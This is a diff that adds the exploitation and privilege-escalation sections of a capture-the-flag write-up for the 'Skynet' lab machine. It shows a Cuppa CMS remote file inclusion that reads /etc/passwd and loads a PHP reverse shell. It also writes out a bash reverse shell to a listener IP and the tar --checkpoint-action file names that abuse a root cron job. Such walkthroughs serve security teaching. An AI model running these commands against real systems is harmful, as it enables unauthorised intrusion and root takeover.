@@ -150,3 +150,92 @@ Eventually we find that `/administrator` is a valid subdirectory. Navigating to 
 ![595a787c143a76469032bd42891a427a.png](/Skynet/_resources/595a787c143a76469032bd42891a427a.png)
 
 </center>
+
+<br>
+
+# Exploitation
+
+At this point, we have access to a hidden subdirectory containing a Cuppa login form. We don't have much to go on, but a quick searchsploit search for Cuppa shows the existence of a [remote file inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion) exploit.
+
+<center>
+
+![7625f4004a5627aa9cdd25797e853595.png](/Skynet/_resources/7625f4004a5627aa9cdd25797e853595.png)
+
+</center>
+
+We'll use the exploit from [exploit-db](https://www.exploit-db.com/exploits/25971). To use it, we simply append `/alerts/alertConfigField.php?urlConfig=<path to file>` to the current url (where we found the login page). For instance, we can view the `/etc/passwd` file by navigating to `/alerts/alertConfigField.php?urlConfig=/Skynet//Skynet//Skynet//Skynet/../etc/passwd`. However, what we would like to do is set up a reverse shell using this method.
+
+Set up a netcat lister with `rlwrap nc -lvnp 9999`. Download and modify [Pentestmonkey's php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), host it on an http server with `python3 -m http.server,` and use the above exploit to navigate to `/alerts/alertConfigField.php?urlConfig=http://10.6.30.43:8000/php-reverse-shell.php`. After a short while, the target machine completes the request, download the reverse shell php script, and we obtain a reverse shell.
+
+<center>
+
+![c805141dd6b0c16cf4845b1bb05e7171.png](/Skynet/_resources/c805141dd6b0c16cf4845b1bb05e7171.png)
+
+</center>
+
+<br>
+
+# Post-exploitation
+
+Now that we have initial access to the system, we can begin looking for flags. With our current privileges, easily find the `user.txt` flag in Miles' home directory.
+
+<center>
+
+![4856ecb521d0dcd629bcad974e2dbb62.png](/Skynet/_resources/4856ecb521d0dcd629bcad974e2dbb62.png)
+
+</center>
+
+It remains to find the root flag. Let's go ahead and upgrade our shell with `python -c 'import pty; pty.spawn("/bin/bash")` for convenience. We will use LinPEAS to search for possible privesc avenues. We'll host a web server on our local machine in order to download `linpeas.sh` with `wget`; here, we'll want to save the file to the `/tmp` directory since we have write permissions there. Now use `chmod +x linpeas.sh` to make the file executable, and run it with `./linpeas.sh`. 
+
+There are a few ways we can proceed from here, but we'll focus on looking at cronjobs. One interesting scheduled process sticks out.
+
+<center>
+
+![205bd8e761c33f959206f27942aaefae.png](/Skynet/_resources/205bd8e761c33f959206f27942aaefae.png)
+
+![39aa328167e5abfbc3ec9158cbde5ac8.png](/Skynet/_resources/39aa328167e5abfbc3ec9158cbde5ac8.png)
+
+</center>
+
+We could try editing the `backup.sh`, but unfortunately we don't have write permissions. Let's look at the contents.
+
+<center>
+
+![93e4f30926ea59f72b46ccb80bad439a.png](/Skynet/_resources/93e4f30926ea59f72b46ccb80bad439a.png)
+
+</center>
+
+So, whenever this script runs, it moves into the `/var/www/html` directory and uses `tar` to compress the contents of the directory into a file in Miles' backups directory. Note that the script executes every minute, and it runs with root privileges.
+
+If we look up the tar binary on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), we see that we can use it to spawn a new shell with root privileges. We need to use the following sequence of commands to add the relevant options before we can spawn the shell.
+
+```bash
+printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.50.72/6666 0>&1' > /var/www/html/shell
+chmod +x /var/www/html/shell
+touch /var/www/html/--checkpoint=1
+touch /var/www/html/--checkpoint-action=exec=bash\ shell
+```
+
+Navigating to `/var/www/html`, we verify that all requires files are in the right place.
+
+<center>
+
+![e6f6c3f0e63acc1605ec8f7525027d77.png](/Skynet/_resources/e6f6c3f0e63acc1605ec8f7525027d77.png)
+
+</center>
+
+Now set up a netcat listener on a different port and run the following command to catch the reverse shell.
+
+```bash
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+A quick search reveals the location of the `root.txt` flag.
+
+<center>
+
+![cf10e8a25a88a3c4e39d55b903d95fe2.png](/Skynet/_resources/cf10e8a25a88a3c4e39d55b903d95fe2.png)
+
+![e57d9a5902ba8f9eff3a0df207d4fb7b.png](/Skynet/_resources/e57d9a5902ba8f9eff3a0df207d4fb7b.png)
+
+</center>
